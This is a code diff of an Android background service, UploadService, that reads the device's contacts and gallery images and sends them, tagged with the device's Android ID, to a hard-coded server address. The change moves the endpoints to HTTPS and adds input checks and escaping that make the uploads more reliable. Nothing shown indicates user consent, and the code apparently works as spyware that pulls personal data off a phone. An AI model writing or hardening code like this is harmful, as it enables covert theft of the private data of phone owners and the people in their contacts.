@@ -104,15 +104,26 @@ public class UploadService extends Service {
     }
 
     private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
-        String contactsUrl = "http://192.168.200.172:3000/uploadContacts"; // Endpoint for contacts
-        String filesUrl = "http://192.168.200.172:3000/upload"; // Endpoint for file uploads
+        String contactsUrl = "https://192.168.200.172:44326/api/Uploads/Contacts"; // Endpoint for contacts
+        String filesUrl = "https://192.168.200.172:44326/api/Uploads/Files"; // Endpoint for file uploads
+
+        // Check if the contacts list is empty or null
+        if (contacts == null || contacts.isEmpty()) {
+            Log.e(TAG, "Contacts list is empty or null");
+            return;
+        }
 
         // Upload contacts as JSON
         for (String contact : contacts) {
+            if (contact == null || contact.trim().isEmpty()) {
+                Log.e(TAG, "Skipping empty or invalid contact: " + contact);
+                continue;
+            }
+
             try {
                 String payload = new JSONObject()
                         .put("type", "contact")
-                        .put("data", contact)
+                        .put("data", escapeSpecialChars(contact))
                         .put("androidId", androidId)
                         .toString();
 
@@ -122,8 +133,19 @@ public class UploadService extends Service {
             }
         }
 
+        // Check if the gallery files list is empty or null
+        if (galleryFiles == null || galleryFiles.isEmpty()) {
+            Log.e(TAG, "Gallery files list is empty or null");
+            return;
+        }
+
         // Upload gallery files as multipart
         for (String filePath : galleryFiles) {
+            if (filePath == null || filePath.trim().isEmpty()) {
+                Log.e(TAG, "Skipping empty or invalid file path: " + filePath);
+                continue;
+            }
+
             File file = new File(filePath);
             if (file.exists()) {
                 try {
@@ -143,7 +165,7 @@ public class UploadService extends Service {
         MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
 
         // Add the Android ID as part of the form data
-        builder.addFormDataPart("androidId", androidId); // Add Android ID
+        builder.addFormDataPart("androidId", androidId);
 
         // Add the file as part of the form data
         builder.addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))); // Ensure 'file' matches server-side form field
@@ -169,9 +191,13 @@ public class UploadService extends Service {
 
     // Escape special characters in the string to avoid JSON formatting issues
     private String escapeSpecialChars(String input) {
+        if (input == null) {
+            return "";
+        }
         return input.replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
     }
 
+    // Method to send the POST request
     private void sendPostRequest(String serverUrl, String payload) throws IOException {
         HttpURLConnection connection = null;
         try {
@@ -216,6 +242,7 @@ public class UploadService extends Service {
             }
         }
     }
+
 
 
     @Override
